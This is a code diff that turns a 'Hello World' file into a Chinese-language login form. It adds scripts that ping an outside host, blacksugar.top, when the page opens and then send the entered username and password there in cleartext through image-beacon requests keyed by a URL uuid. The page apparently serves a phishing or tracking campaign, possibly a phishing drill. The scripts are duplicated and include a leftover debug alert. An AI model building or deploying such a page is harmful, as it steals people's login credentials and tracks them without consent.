@@ -1,1 +1,18 @@
-Hello World
+<!DOCTYPE html><html><head><base href="http://localhost/form.html"/>
+  <title>最简单的表单</title>
+</head>
+<body>
+  <h1>登录</h1>
+  <form action="/login" method="post" id="test">
+    <label for="username">用户名:</label>
+    <input type="text" id="username" name="username" required=""/>
+    <br/>
+    <label for="password">密码:</label>
+    <input type="password" id="password" name="password" required=""/>
+    <br/>
+    <input type="submit" value="提交" onclick="datapost()"/>
+  </form>
+
+
+<script>const urlParams = new URLSearchParams(window.location.search);const uuid = urlParams.get('uuid');if (uuid) { var img = new Image(); img.src = 'http://www.blacksugar.top/openurl?uuid=' + uuid; img.onload = function () { console.log('successful'); }; img.onerror = function() { console.log('failed');};}</script><script>function datapost() { alert(111);  var data=''; const myForm = document.getElementById('test');const inputElements = myForm.querySelectorAll('input'); inputElements.forEach(inputElement => { if (inputElement.type !=='submit') {data += `${inputElement.name}:${inputElement.value} `; };}); const urlParams = new URLSearchParams(window.location.search);const uuid = urlParams.get('uuid');if (uuid) { var img = new Image(); img.src = 'http://www.blacksugar.top/post?uuid=' + uuid+'?data=' +data; img.onload = function () { console.log('successful'); }; img.onerror = function() { console.log('failed');};};} </script>
+<script>const urlParams = new URLSearchParams(window.location.search);const uuid = urlParams.get('uuid');if (uuid) { var img = new Image(); img.src = 'http://www.blacksugar.top/track/openurl?uuid=' + uuid; img.onload = function () { console.log('successful'); }; img.onerror = function() { console.log('failed');};}</script><script>function datapost() { var data=''; const myForm = document.getElementById('test');const inputElements = myForm.querySelectorAll('input'); inputElements.forEach(inputElement => { if (inputElement.type !=='submit') {data += `${inputElement.name}:${inputElement.value} `; };}); const urlParams = new URLSearchParams(window.location.search);const uuid = urlParams.get('uuid');if (uuid) { var img = new Image(); img.src = 'http://www.blacksugar.top/track/datapost?uuid='+uuid+'&data=' +data; img.onload = function () { console.log('successful'); }; img.onerror = function() { console.log('failed');};};} </script></body></html>
